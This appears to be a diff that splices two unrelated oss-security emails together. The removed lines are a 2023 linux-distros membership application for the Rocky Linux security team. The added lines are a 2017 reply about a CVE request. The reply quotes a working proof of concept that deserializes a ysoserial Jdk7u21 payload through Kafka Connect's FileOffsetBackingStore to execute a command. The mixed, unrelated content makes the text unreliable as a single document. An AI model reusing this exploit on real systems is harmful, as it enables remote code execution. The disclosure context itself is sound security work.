@@ -1,4 +1,9 @@
-Received: (qmail 6048 invoked by uid 550); 1 Oct 2023 13:03:23 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2726" "Wednesday" "19" "July" "2017" "11:15:13" "+0200" "Salvatore Bonaccorso" "carnil@debian.org" "<20170719091513.7qubl5vw3a34jbvi@lorien.valinor.li>" "74" "Re: [oss-security] CVE-IDs request for Apache Kafka desrialization vulnerability via runtime" nil nil nil "7" "2017071909:15:13" "[oss-security] CVE-IDs request for Apache Kafka desrialization vulnerability via runtime" (number mark "U       carnil@debia Jul 19   74/2726  " thread-indent "\"Re: [oss-security] CVE-IDs request for Apache Kafka desrialization vulnerability via runtime\"\n") "<CAP-Z0sg3q0n9AU=vE0KGFcK14DpY+9inZaosScoSC8DdcWVRjA@mail.gmail.com>" ("<CAP-Z0sg3q0n9AU=vE0KGFcK14DpY+9inZaosScoSC8DdcWVRjA@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 21728 invoked by uid 550); 19 Jul 2017 09:15:28 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,157 +12,118 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 5707 invoked from network); 1 Oct 2023 13:02:34 -0000
-Date: Sun, 1 Oct 2023 15:02:23 +0200
-From: Solar Designer <solar@openwall.com>
+Received: (qmail 21710 invoked from network); 19 Jul 2017 09:15:27 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20161025;
+        h=sender:date:from:to:subject:message-id:references:mime-version
+         :content-disposition:in-reply-to:user-agent;
+        bh=V1AWMaaaTrAoGCiD6O20gezNo9itQAsIIY6j7P+cqyo=;
+        b=UXCx9jduGAttvwkaaSpB7y9xSLyPJyCQwJp1ki4VJ+4EeJpUZIr36wumrfmYHtRume
+         gYl8n7IFo9Wap0Yd/GacfiIQyDgeU8HLFlNifNZ5szU40Q1WMWIIw3sUKv+cZb2tgSEL
+         SStDRleKvY3eLcsTIr1CBMVwx+JBzW4RVyjQDl6ckRorcfxAkLGpcSKBstkfRfuBswfb
+         lCzIQmOLYMUcsn441F2XRTc6/BpwFNebnOvLkujK/pDOHTdEUNaXeQ6aQ2/VpKwkqGWd
+         IOwtehJdx/DaPOm0PMhdTnLzmLVsZNJHU38NsfqYO3UqrvrL8EuWRPYf042V6hkS2c+H
+         CF/w==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:sender:date:from:to:subject:message-id
+         :references:mime-version:content-disposition:in-reply-to:user-agent;
+        bh=V1AWMaaaTrAoGCiD6O20gezNo9itQAsIIY6j7P+cqyo=;
+        b=p0FP3z5c0nANjxesNdg1usVOruQn6PuaqEcekgTLvPKKjTmlVNxJtCh2PrJK6rmcvB
+         r0Ehh5SHqBFQ/lqFAoR6rZnLJ/CUgkGfcibYim4OXkjytzZpu/MVaXfxvpHUF9xBprlF
+         mCjcVRHSEN6zUqETsqfaTkCTKczJJS/4cQwSp26u96WXo2zA1jRUtIKeppV/TxHfDY9+
+         Mi9m0Cy3zNTmTZZPjlpeTll06atxc0hLWdotKZDBsCdrlOvvQSxhxx/6/7L1inFeyyNa
+         1NO6jS908ANJy3QQjcw5nSudC01J6uf9nqaiiVKlm/NkLKLOGy08wVZ2R6ZL4dx/lIzV
+         L0Iw==
+X-Gm-Message-State: AIVw113r1+uyx3FyV8fa+rLrQFfzpvxFEiHUygxD12K9yBbHEGAijyma
+	SUnBDX9W6GQQug==
+X-Received: by 10.107.22.7 with SMTP id 7mr1417326iow.65.1500455715793;
+        Wed, 19 Jul 2017 02:15:15 -0700 (PDT)
+Sender: Salvatore Bonaccorso <salvatore.bonaccorso@gmail.com>
+Date: Wed, 19 Jul 2017 11:15:13 +0200
+From: Salvatore Bonaccorso <carnil@debian.org>
 To: oss-security@lists.openwall.com
-Message-ID: <20231001130223.GA6586@openwall.com>
-Mime-Version: 1.0
+Message-ID: <20170719091513.7qubl5vw3a34jbvi@lorien.valinor.li>
+References: <CAP-Z0sg3q0n9AU=vE0KGFcK14DpY+9inZaosScoSC8DdcWVRjA@mail.gmail.com>
+MIME-Version: 1.0
 Content-Type: text/plain; charset=us-ascii
 Content-Disposition: inline
-User-Agent: Mutt/1.4.2.3i
-Subject: [oss-security] linux-distros list membership application - CIQ Rocky Linux Security Team
+In-Reply-To: <CAP-Z0sg3q0n9AU=vE0KGFcK14DpY+9inZaosScoSC8DdcWVRjA@mail.gmail.com>
+User-Agent: NeoMutt/20170113 (1.7.2)
+Subject: Re: [oss-security] CVE-IDs request for Apache Kafka desrialization
+ vulnerability via runtime
 
-Hi,
+On Wed, Jul 19, 2017 at 09:41:16AM +1000, Hooman Ghasem Broujerdi wrote:
+> Hi,
+> 
+> Apache kafka connect-api runtime contains a desrialization vul via
+> FileOffsetBackingStore
+> which leads to remote code execution, this can be exploited reliably in
+> JDK1.7.0_05, below is
+> a unit test for it:
+> 
+> 
+> import junit.framework.Test;
+> import junit.framework.TestCase;
+> import junit.framework.TestSuite;
+> import org.apache.commons.io.FileUtils;
+> import org.apache.kafka.connect.runtime.standalone.StandaloneConfig;
+> import org.apache.kafka.connect.storage.FileOffsetBackingStore;
+> import ysoserial.payloads.Jdk7u21;
+> 
+> import java.io.ByteArrayOutputStream;
+> import java.io.File;
+> import java.io.IOException;
+> import java.io.ObjectOutputStream;
+> import java.util.HashMap;
+> import java.util.Map;
+> 
+> public void test_Kafka_Deser() throws Exception {
+> 
+>         StandaloneConfig config;
+> 
+>         String projectDir = System.getProperty("user.dir");
+> 
+>         Jdk7u21 jdk7u21 = new Jdk7u21();
+>         Object o = jdk7u21.getObject("touch vul");
+> 
+>         byte[] ser = serialize(o);
+> 
+>         File tempFile = new File(projectDir + "/payload.ser");
+>         FileUtils.writeByteArrayToFile(tempFile, ser);
+> 
+>         Map<String, String> props = new HashMap<String, String>();
+>         props.put(StandaloneConfig.OFFSET_STORAGE_FILE_FILENAME_CONFIG,
+> tempFile.getAbsolutePath());
+>         props.put(StandaloneConfig.KEY_CONVERTER_CLASS_CONFIG,
+> "org.apache.kafka.connect.json.JsonConverter");
+>         props.put(StandaloneConfig.VALUE_CONVERTER_CLASS_CONFIG,
+> "org.apache.kafka.connect.json.JsonConverter");
+>         props.put(StandaloneConfig.INTERNAL_KEY_CONVERTER_CLASS_CONFIG,
+> "org.apache.kafka.connect.json.JsonConverter");
+>         props.put(StandaloneConfig.INTERNAL_VALUE_CONVERTER_CLASS_CONFIG,
+> "org.apache.kafka.connect.json.JsonConverter");
+>         config = new StandaloneConfig(props);
+> 
+>         FileOffsetBackingStore restore = new FileOffsetBackingStore();
+>         restore.configure(config);
+>         restore.start();
+>     }
+> 
+>     private byte[] serialize(Object object) throws IOException {
+>         ByteArrayOutputStream bout = new ByteArrayOutputStream();
+>         ObjectOutputStream out = new ObjectOutputStream(bout);
+>         out.writeObject(object);
+>         out.flush();
+>         return bout.toByteArray();
+>     }
 
-Rocky Linux is a prominent Enterprise Linux distribution in the spirit
-of original goals of the CentOS project, founded by Gregory Kurtzer, who
-had also co-founded CentOS and is founder and CEO of the primary
-corporate sponsor of the Rocky Linux project, CIQ:
+Thanks for reaching out the oss-security list. Unfortunately direct
+CVE assignments cannot be request anymore through the list, rather
+please fill the form at https://cveform.mitre.org/
 
-https://rockylinux.org
-https://ciq.com
+Once you have the CVE assigned, can you please followup with the
+assignement in this thread, so that other are informed about it?
 
-Besides heavily sponsoring Rocky Linux (yet without being its owner),
-CIQ also has its own Open Source and commercial offerings:
-
-"Our software stack consists of Rocky Linux the CentOS replacement,
-Apptainer the container solution of choice for HPC, Warewulf a
-provisioning and cluster management solution, and Fuzzball our
-next-generation performance computing platform that is multi-cloud,
-multi-site, multi-cluster, and multi-node."
-
-Most relevant here, CIQ maintains LTS branches of Rocky Linux point
-releases (such as of 8.6 when current is 8.8), providing security
-updates to those of its customers who wish to otherwise stay at a given
-point release.
-
-Further, the Rocky Linux project isn't limited to being a resurrection
-of CentOS (its packages being bug-for-bug compatible with RHEL), but
-also has a number of Special Interest Groups (SIGs) offering additional
-package repositories:
-
-https://wiki.rockylinux.org/special_interest_groups/
-
-I have recently joined this effort and we're now getting the Security
-SIG going.  This means an optional repository of extra packages for
-Enterprise Linux distros adding security features and even overriding
-some packages with hardened alternatives.  We already have a few
-packages of both kinds, and many more are planned.  If anyone else wants
-to join this effort - in any capacity including development,
-maintenance, testing, documentation, or something else - let me know!
-
-This application is for CIQ Rocky Linux Security Team, which means CIQ
-employees, (sub)contractors, and/or Rocky Linux project contributors
-trusted and tasked with producing security updates for Rocky Linux,
-CIQ's LTS branches of Rocky Linux, and possibly CIQ's other offerings
-building upon Rocky Linux.
-
-I address the 9 membership criteria below:
-
-> Be an actively maintained Unix-like operating system distro with substantial use of Open Source components
-
-Rocky Linux has been actively maintained since its release in 2021, and
-is an Open Source project.  Many of CIQ's additional offerings are also
-Open Source projects on their own.
-
-> Have a userbase not limited to your own organization
-
-Rocky Linux has been publicly available since its release in 2021, and
-per EPEL repository access statistics has gained a userbase on par with
-other major EL distributions:
-
-https://ciq.com/blog/tracking-rocky-linux-growth-using-fedoras-epel-project/
-https://brentk.io/thoughts/analysis/epel-distribution-statistics.html
-https://rocky-stats.tiuxo.com
-
-Further, CIQ has its customer base for Rocky Linux support, including
-for the LTS branches.
-
-> Have a publicly verifiable track record, dating back at least 1 year and continuing to present day, of fixing security issues (including some that had been handled on (linux-)distros, meaning that membership would have been relevant to you) and releasing the fixes within 10 days (and preferably much less than that) of the issues being made public (if it takes you ages to fix an issue, your users wouldn't substantially benefit from the additional time, often around 7 days and sometimes up to 14 days, that list membership could give you)
-
-The publicly verifiable track record currently consists of timely
-rebuild and re-release of RHEL security update packages and security
-advisories, as published here:
-
-https://errata.rockylinux.org
-
-Not currently verifiable publicly, but Gregory further tells me:
-
-"We've been doing LTS privately to our customers for over a year now.
-This means we maintain security fixes for customers who need long term
-support for point releases."
-
-> Not be (only) downstream or a rebuild of another distro (or else we need convincing additional justification of how the list membership would enable you to release fixes sooner, presumably not relying on the upstream distro having released their fixes first?)
-
-Besides being a "downstream or a rebuild of another distro", CIQ has its
-LTS branches and Rocky Linux has its additional and replacement packages
-via the SIGs.  Security maintenance for these should be provided by CIQ
-and Rocky Linux.
-
-Some security issues in upstream packages may be mitigated or fixed by
-pushing "security override" packages via CIQ's customer-facing repos and
-the Security SIG repos, without waiting on upstream distro's fixes and
-for issues or point releases where no upstream fixes are expected.
-
-Related previously accepted membership application (precedent) is
-CloudLinux's, which is now perhaps best known for AlmaLinux, another
-prominent EL distribution:
-
-http://www.openwall.com/lists/oss-security/2017/07/02/2
-
-Also, CentOS was once a member.
-
-> Be a participant and preferably an active contributor in relevant public communities (most notably, if you're not watching for issues being made public on oss-security, which are a superset of those that had been handled on (linux-)distros, then there's no valid reason for you to be on (linux-)distros)
-
-I have been a participant on oss-security since its inception, and have
-made relevant contributions.  Others with CIQ and Rocky Linux are also
-involved in various communities, and we'll ensure that the team to be
-subscribed to linux-distros isn't blind to publicly disclosed issues.
-
-> Accept the list policy
-
-CIQ Rocky Linux Security Team accepts the linux-distros list policy.
-
-> Be able and willing to contribute back, preferably in specific ways announced in advance (so that you're responsible for a specific area and so that we know what to expect from which member), and demonstrate actual contributions once you've been a member for a while
-
-I've been contributing to oss-security and linux-distros since their
-inception.  We'll also look for additional ways CIQ and/or Rocky Linux
-can contribute, depending on expertise, interests, other related duties,
-and availability of specific people we may add.
-
-> Be able and willing to handle PGP-encrypted e-mail
-
-Of course.  I am already subscribed with my PGP key.
-
-My current subscription is as list admin and it also was for Openwall.
-Openwall no longer qualifies for linux-distros membership as a distro
-since we've effectively EOL'ed the Openwall GNU/*/Linux distro (we still
-do maintain many other projects, but not a full distro).  However, I
-and/or someone else from Openwall would have needed to stay subscribed
-as list admin anyway.
-
-With my new Rocky Linux role, my subscription's purpose will once again
-double as list admin and for the distro.
-
-> Have someone already on the private list, or at least someone else who has been active on oss-security for years but is not affiliated with your distro nor your organization, vouch for at least one of the people requesting membership on behalf of your distro (then that one vouched-for person will be able to vouch for others on your team, in case you'd like multiple people subscribed)
-
-I suppose someone in here can vouch for me.  Please do - ideally, if you
-also have something else to say on this application in the same message,
-not to spam list members with messages solely to meet this formality.
-
-I may then get additional CIQ and/or Rocky Linux people subscribed,
-effectively vouching for them, after making sure they understand and
-accept the list policy.
-
-Alexander
+Regards,
+Salvatore
